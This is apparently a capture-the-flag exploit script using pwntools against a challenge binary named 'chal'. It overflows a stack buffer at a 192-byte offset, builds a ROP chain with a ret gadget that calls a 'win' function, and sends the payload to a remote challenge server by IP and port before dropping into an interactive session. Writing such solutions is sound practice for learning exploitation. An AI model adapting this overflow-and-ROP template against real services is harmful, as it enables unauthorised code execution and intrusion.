#!/usr/bin/env python

from pwn import *

context.log_level = "debug"
context(os="linux", arch="amd64")
context.terminal = ["tmux", "split-window", "-h"]
elf = ELF("./chal")
context.binary = elf

offset = 192

#p = process(elf.path)
p = remote("178.128.214.190", 1348)
#gdb.attach(
#    p,
#    """
#    break *(main+255)
#    continue
#    """,
#)

p.recv()
p.sendline(b"asdf")


payload = offset * b"a" + 8 * b"a"
rop = ROP(elf)

ret = rop.find_gadget(["ret"])[0]
rop.win()
ropchain = rop.chain()
print(rop.dump())

p.sendline(payload + p64(ret) + ropchain)
p.interactive()
p.close()
